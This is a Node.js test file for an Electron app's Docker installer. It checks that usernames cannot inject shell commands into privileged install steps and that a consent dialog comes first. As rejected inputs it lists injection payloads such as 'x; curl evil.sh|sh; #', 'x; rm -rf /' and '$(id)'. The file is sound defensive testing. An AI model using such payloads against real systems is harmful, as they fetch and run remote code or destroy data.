#!/usr/bin/env node
/**
 * Tests for electron/docker_install.js (F7 shell injection).
 *
 * Run:  node tests/test_docker_install.mjs
 *
 * WHY A PLAIN NODE SCRIPT
 * -----------------------
 * `electron/main.js` cannot be required outside Electron (line 1 imports
 * `electron`), which is exactly why the recipe table used to be untestable and
 * the `usermod` shell injection could survive a review unnoticed. The recipes
 * now live in a module with no Electron dependency, so plain `node` can assert
 * on them.
 *
 * The two properties asserted here are independent defences, and this file
 * checks both, because a single one is one bug away from a bypass:
 *   1. NO `usermod` ever appears inside a `bash -c` / `sh -c` string.
 *   2. `readUsername()` refuses anything that is not a legal Unix username.
 *
 * Each defence is negative-tested, not just asserted:
 * `tests/mutation_check_docker_inject.sh` re-breaks the fix in a scratch copy
 * and requires this file to go red — once with `usermod` interpolated into a
 * `bash -c` string again (the R2 regression), once with `isValidUsername()`
 * neutered. It also requires the control, the unmutated copy, to be green, so a
 * red result cannot be an accident. The two mutations break disjoint sets of
 * tests, which is what shows the defences are pinned independently rather than
 * one of them covering for the other. Run by
 * `tests/test_docker_install_js.py`, so `python3 -m pytest tests -q` includes
 * it. Direct: `bash tests/mutation_check_docker_inject.sh`.
 *
 * (The positive tests below — "still does its job", the readUsername/display
 * behaviour, the main.js wiring checks — are not individually mutation-tested;
 * they exist to catch a regression, not to prove this suite non-vacuous.)
 */
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import fs from 'node:fs';

const ROOT = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
const require = createRequire(import.meta.url);
const di = require(path.join(ROOT, 'electron', 'docker_install.js'));
const MAIN_JS = fs.readFileSync(path.join(ROOT, 'electron', 'main.js'), 'utf8');
// Same file with `//` and block-comment text removed, so source-wiring
// assertions look at code and not at prose in comments.
const MAIN_CODE = MAIN_JS
  .replace(/\/\*[\s\S]*?\*\//g, '')
  .split('\n')
  .map(l => l.replace(/\/\/.*$/, ''))
  .join('\n');

let passed = 0;
const failures = [];

function test(name, fn) {
  try {
    fn();
    passed += 1;
    console.log(`PASS ${name}`);
  } catch (err) {
    failures.push({ name, err });
    console.log(`FAIL ${name}`);
    console.log(String(err.message).split('\n').map(l => '      ' + l).join('\n'));
  }
}

const PMS = ['pacman', 'apt', 'dnf-fedora', 'dnf-rhel', 'zypper'];

// ── 1. No usermod inside a shell string ──────────────────────────────────────
/**
 * If this step hands a script string to a shell interpreter, return that
 * string, else null. The install recipes elevate through `pkexec`, so the
 * shell is `prog`'s first argument: `['pkexec', ['bash', '-c', '<script>']]`.
 * A bare `['bash', ['-c', '<script>']]` is handled too.
 */
function shellScriptOf([prog, args]) {
  // Elevated form: ['pkexec', ['bash', '-c', '<script>']]
  if (args.length >= 3 && /^(bash|sh|zsh|dash|ksh)$/.test(args[0]) && args[1] === '-c') {
    return args[2];
  }
  // Bare form: ['bash', ['-c', '<script>']]
  if (/^(bash|sh|zsh|dash|ksh)$/.test(prog) && args.length >= 2 && args[0] === '-c') {
    return args[1];
  }
  return null;
}

test('no recipe puts usermod inside a shell script string', () => {
  for (const pm of PMS) {
    for (const step of di.buildInstallSteps(pm, 'alice')) {
      const script = shellScriptOf(step);
      if (script !== null) {
        assert.ok(
          !script.includes('usermod'),
          `${pm}: usermod found inside a shell script -> ${JSON.stringify(script)}`,
        );
      }
    }
  }
});

test('a username can never appear inside a shell script string', () => {
  // A shell script is the only place in a command line where quoting/escaping
  // can fail, so the rule is: the username is not in one. Ever.
  for (const pm of PMS) {
    for (const step of di.buildInstallSteps(pm, 'alice')) {
      const script = shellScriptOf(step);
      if (script !== null) {
        assert.ok(!script.includes('alice'),
          `${pm}: username interpolated into a shell script -> ${JSON.stringify(script)}`);
      }
    }
  }
});

test('usermod runs as its own argument vector in every recipe', () => {
  for (const pm of PMS) {
    const steps = di.buildInstallSteps(pm, 'alice');
    const usermod = steps.filter(([, args]) => args[0] === 'usermod');
    assert.equal(usermod.length, 1, `${pm}: expected exactly one usermod step`);
    const [prog, args] = usermod[0];
    assert.equal(prog, 'pkexec', `${pm}: usermod must be run via pkexec`);
    // ['usermod', '-aG', 'docker', user] — user is its own argv element.
    assert.deepEqual(args, ['usermod', '-aG', 'docker', 'alice'], pm);
  }
});

test('a metacharacter username is refused before any step is built', () => {
  // Defence 1: the recipe builder re-checks, so even a caller that skipped
  // readUsername() cannot get a hostile name into a command.
  const evil = 'x; curl evil.sh|sh; #';
  assert.throws(() => di.buildInstallSteps('apt', evil), /invalid user name/);
});

test('the username only ever appears as a standalone argv element', () => {
  // Defence 2, asserted positively: for a valid name, the name occurs in the
  // command line only as its own argv slot, never glued to another token.
  // Nothing concatenates it, so there is no quoting/escaping to get wrong.
  for (const pm of PMS) {
    for (const [prog, args] of di.buildInstallSteps(pm, 'alice')) {
      for (const a of args) {
        assert.ok(a === 'alice' || !a.includes('alice'),
          `${pm}: username glued to another token: ${JSON.stringify(a)}`);
      }
    }
  }
});

test('every step is a 2-element [program, args[]] vector of strings', () => {
  for (const pm of PMS) {
    for (const step of di.buildInstallSteps(pm, 'alice')) {
      assert.equal(step.length, 2, pm);
      const [prog, args] = step;
      assert.equal(typeof prog, 'string');
      assert.ok(Array.isArray(args), `${pm}: args must be an array`);
      assert.ok(args.every(a => typeof a === 'string'), `${pm}: args must be strings`);
    }
  }
});

test('recipes contain no backticks/$(...)/${...} in any shell script', () => {
  for (const pm of PMS) {
    for (const step of di.buildInstallSteps(pm, 'alice')) {
      const script = shellScriptOf(step);
      if (script !== null) {
        assert.ok(!/`/.test(script), `${pm}: backtick in shell script: ${script}`);
        assert.ok(!/\$\(/.test(script), `${pm}: command substitution in shell script: ${script}`);
        assert.ok(!/\$\{/.test(script), `${pm}: variable expansion in shell script: ${script}`);
      }
    }
  }
});

test('the repo/package install step still does its job (no regression)', () => {
  assert.ok(di.buildInstallSteps('pacman', 'a')
    .some(([, a]) => a[0] === 'pacman' && a.includes('docker')));
  assert.ok(di.buildInstallSteps('apt', 'a')
    .some(([, a]) => a.join(' ').includes('get.docker.com')));
  assert.ok(di.buildInstallSteps('dnf-fedora', 'a')
    .some(([, a]) => a.join(' ').includes('download.docker.com/linux/fedora')));
  assert.ok(di.buildInstallSteps('dnf-rhel', 'a')
    .some(([, a]) => a.join(' ').includes('download.docker.com/linux/centos')));
  assert.ok(di.buildInstallSteps('zypper', 'a')
    .some(([, a]) => a.join(' ').includes('zypper install')));
  // The daemon is enabled as an argument vector now, so it must still be there.
  for (const pm of PMS) {
    assert.ok(
      di.buildInstallSteps(pm, 'a').some(([, a]) => a[0] === 'systemctl' && a.includes('enable')),
      `${pm}: lost the systemctl enable step`,
    );
  }
});

test('unknown package manager throws instead of building anything', () => {
  assert.throws(() => di.buildInstallSteps('brew', 'alice'), /No install recipe/);
});

test('buildInstallSteps refuses an invalid user name (defence in depth)', () => {
  for (const bad of ['x; rm -rf /', 'a b', '', '$(id)', 'a$USER', '../../x']) {
    assert.throws(() => di.buildInstallSteps('apt', bad), /invalid user name/,
      `should have refused ${JSON.stringify(bad)}`);
  }
});

// ── 2. Username validation ───────────────────────────────────────────────────
test('isValidUsername accepts ordinary account names', () => {
  for (const good of ['alice', 'bob', '_svc', 'user2', 'a-b_c', 'ALICE', 'x'.repeat(31),
                      'machine$']) {
    assert.ok(di.isValidUsername(good), `should accept ${JSON.stringify(good)}`);
  }
});

test('isValidUsername rejects shell metacharacters and injection payloads', () => {
  const bad = [
    'x; curl evil.sh|sh; #',
    'alice;id',
    'alice$(id)',
    'alice`id`',
    'alice|id',
    'alice&&id',
    'alice\nid',
    'alice id',
    '../alice',
    'alice/../bob',
    '-alice',
    '2alice',
    'alice$USER',
    '$alice',
    '',
    '   ',
    null,
    undefined,
    123,
    {},
    ['alice'],
  ];
  for (const v of bad) {
    assert.ok(!di.isValidUsername(v), `should reject ${JSON.stringify(v)}`);
  }
});

test('readUsername returns a valid name from USER or LOGNAME', () => {
  assert.equal(di.readUsername({ USER: 'alice' }), 'alice');
  assert.equal(di.readUsername({ LOGNAME: 'bob' }), 'bob');
  // USER wins when both are set
  assert.equal(di.readUsername({ USER: 'alice', LOGNAME: 'bob' }), 'alice');
});

test('readUsername THROWS on a malicious or missing value', () => {
  // Malicious: must not be passed through in any form.
  for (const env of [
    { USER: 'x; curl evil.sh|sh; #' },
    { USER: 'alice$(id)' },
    { USER: 'alice id' },
    { LOGNAME: 'a-b;id' },
  ]) {
    let threw = null;
    try { di.readUsername(env); } catch (e) { threw = e; }
    assert.ok(threw, `expected a throw for ${JSON.stringify(env)}`);
    assert.match(threw.message, /Refusing to continue/);
    // The raw value must not be echoed back anywhere in the message.
    assert.ok(!threw.message.includes(env.USER || env.LOGNAME),
      'the untrusted value must not appear in the error message');
  }
  // Missing entirely.
  for (const env of [{}, { USER: '' }, { LOGNAME: '' }]) {
    assert.throws(() => di.readUsername(env), /Cannot determine the current user name/);
  }
});

test('displayUsername degrades to a placeholder, never to raw input', () => {
  assert.equal(di.displayUsername({ USER: 'alice' }), 'alice');
  assert.equal(di.displayUsername({ USER: 'x; <b>spoofed</b>' }), 'your account');
  assert.equal(di.displayUsername({}), 'your account');
});

// ── 3. main.js wiring: the consent gate must not regress ─────────────────────
test('main.js validates the username before any privileged step', () => {
  // readUsername() inside installDocker(), and the raw `process.env.USER ||
  // process.env.LOGNAME` expression must be gone from the file entirely.
  assert.ok(!/process\.env\.USER\s*\|\|\s*process\.env\.LOGNAME/.test(MAIN_CODE),
    'raw USER/LOGNAME read still present in main.js');
  assert.ok(/const user = readUsername\(process\.env\);/.test(MAIN_CODE),
    'installDocker() must call readUsername()');
});

test('main.js still gates on consent, first, with Cancel as default AND cancel', () => {
  const body = MAIN_CODE.slice(MAIN_CODE.indexOf('async function installDocker'));
  const consentAt = body.indexOf('confirmDockerGroupConsent(');
  const stepsAt = body.indexOf('buildInstallSteps(');
  assert.ok(consentAt > 0 && stepsAt > consentAt,
    'consent must be confirmed before the recipe table is built');
  // No usermod in executable main.js code — the recipe table owns it now.
  assert.ok(!/usermod/.test(MAIN_CODE),
    'main.js must not contain a usermod string; it belongs in the recipe table');
  // The consent dialog itself: index 0 must be Cancel for BOTH Enter and Escape.
  const dialog = MAIN_CODE.slice(MAIN_CODE.indexOf('async function confirmDockerGroupConsent'));
  assert.match(dialog, /buttons:\s*\['Cancel',\s*'I understand, add me'\]/);
  assert.match(dialog, /defaultId:\s*0/);
  assert.match(dialog, /cancelId:\s*0/);
  assert.match(dialog, /return response === 1/);
});

console.log(`\n${passed}/${passed + failures.length} passed`);
process.exit(failures.length ? 1 : 0);
